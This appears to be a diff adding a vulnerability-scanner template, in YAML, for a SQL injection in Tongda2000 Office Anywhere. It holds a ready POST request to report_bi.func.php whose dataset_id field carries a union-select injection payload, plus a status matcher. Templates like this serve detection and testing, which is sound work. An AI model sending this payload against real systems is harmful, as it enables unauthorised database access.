@@ -1,0 +1,21 @@
+id: yaml-poc-tongda2000-office_anywhere-sql_injection-CT-416624
+info:
+  name: Yaml Poc Tongda2000 Office_Anywhere Sql_Injection Ct 416624
+  author: converted
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-tongda2000-office_anywhere-sql_injection-CT-416624'
+  tags: sqli
+  reference: []
+http:
+- method: POST
+  path:
+  - /general/bi_design/appcenter/report_bi.func.php
+  body: _POST[dataset_id]=efgh'-@`'`)union+select+1,2,md5({{f1}})#'&action=get_link_info
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
